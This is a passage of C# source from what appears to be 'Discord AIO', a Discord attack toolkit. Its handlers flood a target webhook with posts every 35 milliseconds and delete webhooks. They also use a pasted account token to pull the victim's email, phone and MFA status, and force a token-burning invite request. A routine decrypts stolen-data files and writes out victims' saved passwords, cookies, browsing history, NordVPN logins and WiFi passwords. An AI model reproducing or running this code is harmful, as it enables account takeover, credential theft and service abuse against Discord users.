                        openedFile.WriteByte(0);
                    }
                    openedFile.Close();
                    PopupMessage(pumpedTo + pumpSize.ToString() + "GB");
                }
                else
                {
                    PopupMessage(selectpumpsize);
                }
            }
            catch
            {
                PopupMessage(sthww);
            }

        }

        private void kbBox_CheckedChanged(object sender, EventArgs e)
        {
            if (kbBox.Checked)
            {
                mbBox.Checked = false;
                gbBox.Checked = false;
            }
        }

        private void mbBox_CheckedChanged(object sender, EventArgs e)
        {
            if (mbBox.Checked)
            {
                kbBox.Checked = false;
                gbBox.Checked = false;
            }
        }

        private void gbBox_CheckedChanged(object sender, EventArgs e)
        {
            if (gbBox.Checked)
            {
                mbBox.Checked = false;
                kbBox.Checked = false;
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(miscWebhookBox.Text) || String.IsNullOrWhiteSpace(miscWebhookBox.Text))
            {
                PopupMessage(whcbe);
            }
            else
            {
                WebClient checkWebhook = new WebClient();
                try
                {
                    string webhook = checkWebhook.DownloadString(miscWebhookBox.Text);
                    PopupMessage(whvalid);
                }
                catch
                {
                    PopupMessage(whinvalid);
                }
            }
        }

        private void wdeleteButton_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(miscWebhookBox.Text) || String.IsNullOrWhiteSpace(miscWebhookBox.Text))
            {
                PopupMessage(whcbe);
            }
            else
            {
                try
                {
                    new HttpRequest().Delete(miscWebhookBox.Text).ToString();
                    PopupMessage(whdeleted);
                }
                catch
                {
                    PopupMessage(whinvalid);
                }
            }
        }

        private bool webhookSwitch = false;
        private bool webHandler = false;

        private void button6_Click(object sender, EventArgs e)
        {
            webhookSwitch = false;
            webHandler = false;
            PopupMessage(whfstop);
            button6.FlatAppearance.BorderSize = 1;
            button6.Text = stopped;
            button5.FlatAppearance.BorderSize = 0;
            button5.Text = start;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(miscWebhookBox.Text) || String.IsNullOrWhiteSpace(miscWebhookBox.Text) || (String.IsNullOrEmpty(userBox.Text) || String.IsNullOrWhiteSpace(userBox.Text) || (String.IsNullOrEmpty(textBox2.Text) || String.IsNullOrWhiteSpace(textBox2.Text))))
            {
                PopupMessage(whusmsempty);
            }
            else
            {
                string SPAMwebhook = miscWebhookBox.Text;
                string SPAMname = userBox.Text;
                string SPAMmessage = textBox2.Text;
                string embedColor = flooderEmbed.BackColor.ToArgb().ToString();
                embedColor = embedColor.Remove(0, 1);

                webhookSwitch = true;

                button6.FlatAppearance.BorderSize = 0;
                button6.Text = stop;
                button5.FlatAppearance.BorderSize = 1;
                button5.Text = started;

                if (safeBox.Checked)
                {
                    new Thread(() =>
                    {
                        while (webhookSwitch)
                        {
                            try
                            {
                                using (HttpRequest req = new HttpRequest())
                                {
                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
                                    Thread.Sleep(2000);
                                }
                            }
                            catch
                            {
                                if (webHandler == false)
                                {
                                    webhookSwitch = false;
                                    PopupMessage(toomany);
                                    Thread.Sleep(3000);
                                    webhookSwitch = true;
                                }
                            }
                        }
                    }).Start();
                }
                else
                {
                    new Thread(() =>
                    {
                        while (webhookSwitch)
                        {
                            try
                            {
                                using (HttpRequest req = new HttpRequest())
                                {
                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
                                    Thread.Sleep(35);
                                }
                            }
                            catch
                            {
                                if (webHandler == false)
                                {
                                    webhookSwitch = false;
                                    PopupMessage(toomany);
                                    Thread.Sleep(500);
                                    webhookSwitch = true;
                                }
                            }
                        }
                    }).Start();
                }

            }
        }

        private void flooderEmSelect_Click(object sender, EventArgs e)
        {
            ColorDialog dlg = new ColorDialog();
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                flooderEmbed.BackColor = Color.FromArgb(dlg.Color.A, dlg.Color.R, dlg.Color.G, dlg.Color.B);
            }
        }

        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                int Start, End;
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }

            return "";
        }

        private void tokenChecker_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(TokenCheckerBox.Text) || String.IsNullOrWhiteSpace(TokenCheckerBox.Text))
            {
                PopupMessage(tokencannotempt);
            }
            else
            {
                string token = TokenCheckerBox.Text;
                try
                {

                    HttpRequest req = new HttpRequest();
                    req.AddHeader("Authorization", token);
                    var tokenReq = req.Get("https://discordapp.com/api/users/@me");
                    string tokenCreds = tokenReq.ToString();

                    string nameData = getBetween(tokenCreds, "username\": ", ",");
                    string nameDISData = getBetween(tokenCreds, "discriminator\": ", ",");
                    string emailData = getBetween(tokenCreds, "email\": ", ",");
                    string phoneData = getBetween(tokenCreds, "phone\": ", "}");
                    string idData = getBetween(tokenCreds, "id\": ", ",");
                    string mfaData = getBetween(tokenCreds, "mfa_enabled\": ", ",");
                    string vData = getBetween(tokenCreds, "verified\": ", ",");
                    string avatarData = getBetween(tokenCreds, "avatar\": ", ",");

                    // Trims
                    tNameLabel.Text = nameData.Trim('"') + " #" + nameDISData.Trim('"');
                    tEmailLabel.Text = emailData.Trim('"');
                    tPhoneLabel.Text = phoneData.Trim('"');
                    string trimedID = idData.Trim('"');
                    string trimedMFA = mfaData.Trim('"');
                    string trimedVRF = vData.Trim('"');
                    string trimedAvatar = avatarData.Trim('"');
                    tIDLabel.Text = trimedID;

                    // MFA label
                    string credMFA = disabled;
                    if (trimedMFA == "true")
                    {
                        credMFA = enabled;
                    }
                    tMFALabel.Text = credMFA;

                    // Verified label
                    string credVRF = unverified;
                    if (trimedVRF == "true")
                    {
                        credVRF = verified;
                    }
                    tVLabel.Text = credVRF;

                    // Avatar
                    string link = "https://cdn.discordapp.com/avatars/" + trimedID + "/" + trimedAvatar + ".jpg";
                    var request = WebRequest.Create(link);

                    using (var response = request.GetResponse())
                    using (var stream = response.GetResponseStream())
                    {
                        avatarBox.Image = Bitmap.FromStream(stream);
                    }
                }
                catch
                {
                    PopupMessage(invalidtoken);
                }

            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            string token = TokenCheckerBox.Text;
            if (String.IsNullOrEmpty(TokenCheckerBox.Text) || String.IsNullOrWhiteSpace(TokenCheckerBox.Text))
            {
                PopupMessage(tokencannotempt);
            }
            else
            {
                try
                {
                    HttpRequest req = new HttpRequest();
                    req.AddHeader("Authorization", token);
                    req.Post("https://discordapp.com/api/v6/invite/minecraft");
                }
                catch
                {
                    PopupMessage(tokendeleted);
                }
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                checkBox3.Checked = false;
                checkBox4.Checked = false;
            }
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked)
            {
                checkBox2.Checked = false;
                checkBox4.Checked = false;
            }
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox4.Checked)
            {
                checkBox2.Checked = false;
                checkBox3.Checked = false;
            }
        }

        private void exportCredentials_Click(object sender, EventArgs e)
        {
            string passwordsData = "N/A";
            string cookiesData = "N/A";
            string historyData = "N/A";
            string vpnData = "N/A";
            string wifiData = "N/A";
            string wifiNetwork = "N/A";

            try
            {
                using (OpenFileDialog open = new OpenFileDialog())
                {
                    open.Filter = "dAIO (*.dAIO)|*.dAIO";
                    if (open.ShowDialog() == DialogResult.OK)
                    {
                        string creText = File.ReadAllText(open.FileName);
                        string directoryPath = Path.GetDirectoryName(open.FileName);
                        dAIObox.Text = directoryPath;
                        if (creText.Contains("Discord AIO"))
                        {
                            if (creText.Contains("# Passwords"))
                            {
                                passwordsData = getBetween(creText, "# Passwords", "# End of Passwords");

                                using (StreamWriter file = new StreamWriter("Passwords.txt"))
                                {
                                    foreach (string s in Regex.Split(passwordsData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nopass);
                            }

                            if (creText.Contains("# Cookies"))
                            {
                                cookiesData = getBetween(creText, "Cookies", "# End of Cookies");

                                using (StreamWriter file = new StreamWriter("Cookies.txt"))
                                {
                                    foreach (string s in Regex.Split(cookiesData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nocookies);
                            }

                            if (creText.Contains("# History"))
                            {
                                historyData = getBetween(creText, "History", "# End of History");

                                using (StreamWriter file = new StreamWriter("History.txt"))
                                {
                                    foreach (string s in Regex.Split(historyData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nohistory);
                            }

                            if (creText.Contains("# NordVPN"))
                            {
                                vpnData = getBetween(creText, "NordVPN", "# End of NordVPN");

                                using (StreamWriter file = new StreamWriter("NordVPN.txt"))
                                {
                                    foreach (string s in Regex.Split(vpnData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(novpn);
                            }

                            if (creText.Contains("# Wifi Network"))
                            {
                                wifiNetwork = getBetween(creText, "Wifi Network", "# End of Wifi Network");

                                using (StreamWriter file = new StreamWriter("WiFiNetwork.txt"))
                                {
                                    foreach (string s in Regex.Split(wifiNetwork, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nowifinetwork);
                            }

                            if (creText.Contains("# Wifi Password") && creText.Contains("# Wifi Network"))
                            {
                                wifiData = getBetween(creText, "Wifi Password", "# End of Wifi Password");

                                using (StreamWriter file = new StreamWriter("WiFiPasswords.txt"))
                                {
                                    foreach (string s in Regex.Split(wifiData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nowifipass);
                            }
                        }
                        else
                        {
                            string decryptedText = Decrypt(creText);

                            creText = creText.Replace(creText, decryptedText);
                            File.WriteAllText(open.FileName, creText);

                            if (decryptedText.Contains("# Passwords"))
                            {
                                passwordsData = getBetween(decryptedText, "# Passwords", "# End of Passwords");

                                using (StreamWriter file = new StreamWriter("Passwords.txt"))
                                {
                                    foreach (string s in Regex.Split(passwordsData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nopass);
                            }

                            if (decryptedText.Contains("# Cookies"))
                            {
                                cookiesData = getBetween(decryptedText, "Cookies", "# End of Cookies");

                                using (StreamWriter file = new StreamWriter("Cookies.txt"))
                                {
                                    foreach (string s in Regex.Split(cookiesData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nocookies);
                            }

                            if (decryptedText.Contains("# History"))
                            {
                                historyData = getBetween(decryptedText, "History", "# End of History");

                                using (StreamWriter file = new StreamWriter("History.txt"))
                                {
                                    foreach (string s in Regex.Split(historyData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nohistory);
                            }

                            if (decryptedText.Contains("# NordVPN"))
                            {
                                vpnData = getBetween(decryptedText, "NordVPN", "# End of NordVPN");

                                using (StreamWriter file = new StreamWriter("NordVPN.txt"))
                                {
                                    foreach (string s in Regex.Split(vpnData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(novpn);
                            }

                            if (decryptedText.Contains("# Wifi Network"))
                            {
                                wifiNetwork = getBetween(decryptedText, "Wifi Network", "# End of Wifi Network");

                                using (StreamWriter file = new StreamWriter("WiFiNetwork.txt"))
                                {
                                    foreach (string s in Regex.Split(wifiNetwork, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nowifinetwork);
                            }

                            if (decryptedText.Contains("# Wifi Password") && decryptedText.Contains("# Wifi Network"))
                            {
                                wifiData = getBetween(decryptedText, "Wifi Password", "# End of Wifi Password");

                                using (StreamWriter file = new StreamWriter("WiFiPasswords.txt"))
                                {
                                    foreach (string s in Regex.Split(wifiData, "\n"))
                                        file.WriteLine(s);
                                }
                            }
                            else
                            {
                                PopupMessage(nowifipass);
                            }
                        }
                    }
                }
            }
            catch
            {
            }
        }

        private void btnUpdates_Click(object sender, EventArgs e)
        {
            WebClient vClient = new WebClient();
            string downloadedVersion = vClient.DownloadString("https://pastebin.com/raw/hxxHrBni");

            if (version == downloadedVersion)
            {
                checkingLabel.ForeColor = Color.DarkRed;
                checkingLabel.Text = "Your version is up-to-date";
            }
            else
            {
                checkingLabel.ForeColor = Color.DarkRed;
                checkingLabel.Text = "There is a newer version avaible [" + downloadedVersion + "]";
            }

        }
    }
}
